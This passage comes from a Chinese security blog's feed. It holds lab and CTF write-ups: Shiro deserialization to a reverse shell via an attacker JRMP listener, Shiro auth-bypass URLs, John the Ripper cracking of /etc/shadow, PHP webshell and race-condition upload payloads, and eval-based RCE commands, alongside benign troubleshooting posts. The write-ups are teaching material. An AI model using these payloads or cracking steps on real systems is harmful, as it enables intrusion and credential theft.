&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>代码中key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)这一行括号内即为AES加密的密钥，如果密钥是其他的，在这里就填写其他的密钥。脚本运行的命令如下（读者应当更改为攻击机ip:JRMP监听的端口号），注意shiro.py的位置应当保证和ysoserial.jar在同一目录下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro.py 192.168.192.133:7777</span><br></pre></td></tr></table></figure><p>这样我们就生成了请求包中rememberMe的payload2：<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b79377aefe08908354caa21b14aa6bdc.png" alt="img"></p><p>step4:更改请求包中cookie的rememberMe字段</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/66d8b31a6da48a1111e95e9630a90d35.png" alt="img"></p><p>我们要在这个数据包的Cookie字段后添加rememberMe字段，添加后的截图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/afddc68f09bcabc6d4bfafd8ef88b694.png" alt="img"></p><p>然后点击发送go，返回如下，可以看到响应包中的rememberMe=deleteMe字段：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/95cf91d1d4e5249d14d398b0c6748f3a.png" alt="img"></p><p>这样应该就应该漏洞利用成功了，我们看一下刚才JRMP监听的端口，可以看到这个服务与靶机（192.168.200.129）进行了连接通信：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/48477a82a4d7e2ec5ead3508bb66289a.png" alt="img"></p><p>再看一下攻击机监听的6666端口，成功获取了反弹shell。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6e29b76c89cffb995e65d9c11266a157.png" alt="img"></p><p>这样就成功了，此时已经可以执行任意命令了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c551dc623cf208855178523f1d9ff6e1.png" alt="img"></p><h5 id="攻击过程复盘">攻击过程复盘</h5><p>对于攻击者而言，核心就是干了两件事：</p><p>1.搭建VPS进行JRMPListener，存放反弹shell的payload1</p><p>2.将上述VPS进行JRMPListener的地址进行了AES加密和base64编码，构造请求包cookie中的rememberMe字段，向存在漏洞的服务器发送加密编码后的结果payload2。</p><p>那么对于靶机服务器，他是怎么沦陷的呢？</p><p>1.接收到请求包payload2，对他进行base64解码=&gt;AES解密，发现要和一个VPS的JRMP 7777端口进行通信。</p><p>2.向恶意站点VPS的JRMP 7777进行请求，接收到了到了序列化后的恶意代码（反弹shell到攻击机的6666端口）payload1。</p><p>3.对payload1执行了反序列化，执行了反弹shell的恶意命令，就此沦陷。</p><h4 id="使用工具复现">使用工具复现</h4><p>使用win10的工具pyke-shiro</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181125476.png" alt="image-20250330181125476"></p><p>看到存在Shiro框架且爆破出来了key值，然后我们检测利用链然后爆破一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181444484.png" alt="image-20250330181444484"></p><p>然后就可以命令执行或者打内存马了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330181608319.png" alt="image-20250330181608319"></p><h3 id="Apache-Shiro认证绕过漏洞（CVE-2020-1957）">Apache Shiro认证绕过漏洞（CVE-2020-1957）</h3><h4 id="漏洞详情">漏洞详情</h4><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造…;这样的跳转，可以绕过Shiro中对目录的权限限制</p><h4 id="复现">复现</h4><p>靶机开启环境后，攻击机直接访问ip:8080端口</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330182715628.png" alt="image-20250330182715628"></p><p>直接请求管理页面/admin/，无法访问，将会被重定向到登录页面,构造恶意请求/xxx/…;/admin/，即可绕过权限校验，访问到管理页面：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d354235a495d492caab88a4a121e2984.png" alt="在这里插入图片描述"></p><h3 id="Apache-Shiro-认证绕过漏洞（CVE-2010-3863）">Apache Shiro 认证绕过漏洞（CVE-2010-3863）</h3><h4 id="漏洞详情-2">漏洞详情</h4><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造/、//、/./、/…/ 等绕过权限验证</p><h4 id="复现-2">复现</h4><p>直接请求管理页面/admin，无法访问，将会被重定向到登录页面</p><p>构造恶意请求/./admin，即可绕过权限校验，访问到管理页面</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330184715714.png" alt="image-20250330184715714"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330184851335.png" alt="image-20250330184851335"></p>]]></content>
    
    
    <summary type="html">🥧Shiro反序列化漏洞全解析;shiro漏洞成因;shiro漏洞环境及shiro漏洞复现;shiro漏洞特征；shiro550（CVE-2016-4437）漏洞原理和漏洞复现；Apache Shiro认证绕过漏洞（CVE-2020-1957）漏洞原理和漏洞复现；Apache Shiro 认证绕过漏洞（CVE-2010-3863）漏洞原理和漏洞复现</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>linux、windows密钥暴力破解工具john的使用</title>
    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
    <published>2025-03-18T16:00:00.000Z</published>
    <updated>2025-03-19T14:19:17.023Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="什么是john">什么是john</h4><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><p>john一般是kali自带。</p><h4 id="john参数表">john参数表</h4><p><code>john</code> 命令的具体参数选项如下表：</p><table><thead><tr><th>选 项</th><th>描 述</th></tr></thead><tbody><tr><td>–single</td><td>single crack 模式，使用配置文件中的规则进行破解</td></tr><tr><td>–wordlist=FILE–stdin</td><td>字典模式，从 FILE 或标准输入中读取词汇</td></tr><tr><td>–rules</td><td>打开字典模式的词汇表切分规则</td></tr><tr><td>–incremental[=MODE]</td><td>使用增量模式</td></tr><tr><td>–external=MODE</td><td>打开外部模式或单词过滤，使用 [List.External:MODE] 节中定义的外部函数</td></tr><tr><td>–stdout[=LENGTH]</td><td>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上</td></tr><tr><td>–restore[=NAME]</td><td>恢复被中断的破解过程，从指定文件或默认为 $JOHN/john.rec 的文件中读取破解过程的状态信息</td></tr><tr><td>–session=NAME</td><td>将新的破解会话命名为 NAME ，该选项用于会话中断恢复和同时运行多个破解实例的情况</td></tr><tr><td>–status[=NAME]</td><td>显示会话状态</td></tr><tr><td>–make-charset=FILE</td><td>生成一个字符集文件，覆盖 FILE 文件，用于增量模式</td></tr><tr><td>–show</td><td>显示已破解口令</td></tr><tr><td>–test</td><td>进行基准测试</td></tr><tr><td>–users=[-]LOGIN|UID[,…]</td><td>选择指定的一个或多个账户进行破解或其他操作，列表前的减号表示反向操作，说明对列出账户之外的账户进行破解或其他操作</td></tr><tr><td>–groups=[-]GID[,…]</td><td>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。</td></tr><tr><td>–shells=[-]SHELL[,…]</td><td>对使用指定 shell 的账户进行操作，减号表示反向操作</td></tr><tr><td>–salts=[-]COUNT</td><td>至少对 COUNT 口令加载加盐，减号表示反向操作</td></tr><tr><td>–format=NAME</td><td>指定密文格式名称，为 DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM 之一</td></tr><tr><td>–save-memory=LEVEL</td><td>设置内存节省模式，当内存不多时选用这个选项。 LEVEL 取值在 1~3 之间</td></tr></tbody></table><h4 id="etc-passed和etc-shadow文件">etc/passed和etc/shadow文件</h4><p>首先要知道 /etc/passwd文件和 /etc/shadow文件</p><p>/etc/passwd文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>上面数据为passwd文件的一个片段，我们可以发现每一行都被<code>分号</code>分为了<code>7部分</code>。这七部分分别为：</p><blockquote><ol><li>用户名</li><li>密码(passwd文件人人可读，所以不放明文密码，真正的密码在/etc/shadow文件中)</li><li>uid</li><li>gid</li><li>用户注释</li><li>主目录</li><li>登陆的shell类型(bash/zsh/sh等)</li></ol></blockquote><p>/etc/shadow文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>也是被分号隔开格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">密码，其中\$6\$是表示一种类型标记为6的密码散列suans fa,这里指SHA-512哈希算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512,salt 表示密码学中的 Salt, 系统随机生成 encrypted 表示密码的 hash,其中f0EotKbw为salt。</span><br><span class="line">“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。</span><br><span class="line">“最小时间间隔”指的是两次修改口令之间所需的最小天数。</span><br><span class="line">“最大时间间隔”指的是口令保持有效的最大天数。</span><br><span class="line">“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</span><br><span class="line">“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。</span><br><span class="line">“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</span><br></pre></td></tr></table></figure><h4 id="爆破linux用户密码实例">爆破linux用户密码实例</h4><p><strong>利用 <code>unshadow</code> 组合 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 两个文件</strong></p><p><code>unshadow</code> 命令会将 <code>/etc/passwd</code> 的数据和 <code>/etc/shadow</code> 的数据结合起来，创建 <code>1</code> 个含有用户名和密码详细信息的文件。</p><p>我们可以通过以下命令将这两个文件结合起来：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>使用 <code>John the Ripper</code> 破解 <code>Linux</code> 用户登录密码</strong></p><p>我们这时候还需要一个字典，由于 <code>John</code> 自带了一个字典，字典位于 <code>/usr/share/john/password.lst</code> 。当然你也可以自行去网上选择适合你的字典。</p><p>我们可以开始对Linux登录用户名和密码进行破解：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>破解结果如下：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>我们可以看到， <code>test_passwd</code> 文件中存在的三个用户名 <code>root</code> ，<code>test</code> ， <code>python</code> 的密码，均被破解了。</p><p>我们可以查看破解信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="出现报错：-UTF-8-No-password-hashes-loaded">出现报错： UTF-8 No password hashes loaded</h4><p>John the Ripper 正确使用方法<br>现在 John the Ripper 爆破linux的shadow文件时需要加上 --format=crypt</p><p>所以现在 John the Ripper 的使用命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>原因是，如果查看合并后的文件或者没合并使用的shadow文件，并在用户名后面看到 <strong>$y$</strong>，则表明密码已使用 yescrypt 进行哈希处理。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧kali中暴力破解工具john的使用方法以及命令解析;/etc/passwd文件和/etc/shadow文件格式;linux密码爆破实例;出现报错：“UTF-8 No password hashes loaded”的原因及解决方法</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite中文版出现显示错位情况解决</title>
    <link href="https://blog.m3x1.cn/posts/3f399677.html"/>
    <id>https://blog.m3x1.cn/posts/3f399677.html</id>
    <published>2025-03-17T16:00:00.000Z</published>
    <updated>2025-03-20T16:06:00.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="问题描述">问题描述</h4><p>​在使用BurpSuite汉化版时抓取http数据包出现显示错位情况，这是因为中文版的字体不一样导致的，需要修改字体。</p><h4 id="解决方法">解决方法</h4><p>​修改BurpSuite汉化版的http字体显示。</p><p>打开设置，在message editor中找到“HTTP消息的显示方式”，修改如下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3f0228200b1b14ba279f13876b27bc1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧BurpSuite中文版出现显示错位情况解决-修改字体</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>刷题2025.3.15</title>
    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
    <published>2025-03-14T16:00:00.000Z</published>
    <updated>2025-03-18T14:15:08.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：NSSCTF平台</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-新生赛-easyupload2-0">[SWPUCTF 2021 新生赛]easyupload2.0</h4><blockquote><p>考点：文件上传绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>进行文件上传测试，首先上传jpg文件，然后抓包改成php文件，结果提示php文件不能上传。</p><p>上传htaccess文件也不行，于是改成后缀为phtml。</p><p>phtml也会被当成php解析。</p><p>发现上传成功，用蚁剑连接，找到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-新生赛-PseudoProtocols">[SWPUCTF 2021 新生赛]PseudoProtocols</h4><blockquote><p>考点：PHP伪协议，文件包含</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>先扫一下目录，发现什么都没有，然后看到需要传参，又要读取hint.php，使用filter伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>得到一串base64，解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接访问/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>直接使用data协议绕过file_get_contents函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-加速加速">[FSCTF 2023]加速加速</h4><blockquote><p>考点：条件竞争</p></blockquote><p>先把后缀改成.jpg拿到对方保存文件的路径，为当前路径下的upload目录里。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">看见标签是条件竞争，那就按照条件竞争的方法去做。</p><p>先创建一个jz-cmd.php文件，运行创建cmd.php文件并写入一句话木马的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先抓取上传文件的数据包，再抓取访问upload文件夹里的jz-cmd.php这两个数据包；虽然上传jz-cmd.php是不被允许的，但其实这个文件在服务器上有存在过，只是很快就被删除了。所以我们用BP疯狂发包访问upload文件夹下的jz-cmd.php文件是道理的。而只要此jz-cmd.php被访问成功，就会在upload文件夹里创建cmd.php这个后门文件。</p><p>具体操作就是抓取上传和访问的数据包，然后将他们都放入intruder中，设置如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" alt="1698322910515"></p><p>然后就先攻击发送的数据包，再攻击读取（读取cmd.php）的数据包。读取的包出现200，且浏览器能正常访问，说明一句话木马就写入进去了，用蚁剑连接找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
    
    
    <summary type="html">2025.3.15刷题题目:[SWPUCTF 2021 新生赛]easyupload2.0,[SWPUCTF 2021新生赛]PseudoProtocols,[FSCTF 2023]加速加速</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</title>
    <link href="https://blog.m3x1.cn/posts/e4e8b439.html"/>
    <id>https://blog.m3x1.cn/posts/e4e8b439.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:15.465Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="问题描述：">问题描述：</h2><p>在某一天使用hexo d命令时突然出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh:connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></table></figure><p>之前都是可以链接的，后来换了地方突然链接不上github了。</p><h2 id="问题分析：">问题分析：</h2><p>根据错误提示知道，连接不成功可能是：</p><ol><li>网络问题</li><li>ssh密钥需要重新添加</li><li>22端口被占用</li></ol><p>根据此进行尝试解决，应该能解决。我就是第三个问题</p><h2 id="解决方法：">解决方法：</h2><h4 id="情况一：">情况一：</h4><p>检查网络连接情况，检查代理是否开启。然后ping一下看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure><h4 id="情况二：">情况二：</h4><p>直接重新添加ssh密钥就行</p><h4 id="情况三：">情况三：</h4><p>这也是我的情况，可能是22端口不行或者被占用，就需要换个端口。</p><p>操作方法：</p><p>1.进入~/.ssh下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>2.创建一个config文件(这里我用的vim编辑器)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>3.编辑文件内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><p>4.保存退出</p><p>5.检查是否成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里要根据它的提示操作，有个地方要输入yes。</p><p>然后再试试hexo d，估计就能提交了。</p><p>（<a href="http://xn--pinggithub-wj2ph1j7w8fubmba3571oi6a.com">但是我还是ping不通github.com</a>，不知道为什么，但是换个端口也能传上去。有大佬知道的请指教！）</p>]]></content>
    
    
    <summary type="html">🥧Git问题：解决“ssh:connect to host github.com port 22: Connection timed out”</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>本地搭建deepseek</title>
    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:36.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备阶段">准备阶段</h2><p>先下载Ollama和chatbox安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>在电脑上安装后即可</p><h2 id="搭建步骤">搭建步骤</h2><p>安装之后，按win+r，输入cmd进入命令框</p><p>然后我们在回到ollama的官网：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>复制后面的代码到命令框下载，等待它下载完</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>然后打开chatbox，选择使用本地模型</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>模型位置点击三角形位置选择安装好的deepseek模型，上下文消息数量20那个位置记得选择不限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>根据自己喜好设置其他选项，点击保存，然后就可以试试对话了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>至此初始化就完成了，基本的功能就完成了。</p><h2 id="启动注意事项">启动注意事项</h2><p>每次在chatbox启动的时候，都要先在命令框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #查看mode</span><br><span class="line">ollama run modename    #运行mode</span><br></pre></td></tr></table></figure><p>然后才能在chatbox本地使用。</p><p>否则会报错没有网络。</p>]]></content>
    
    
    <summary type="html">🥧本地搭建deepseek</summary>
    
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-rce</title>
    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行">eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含">文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat 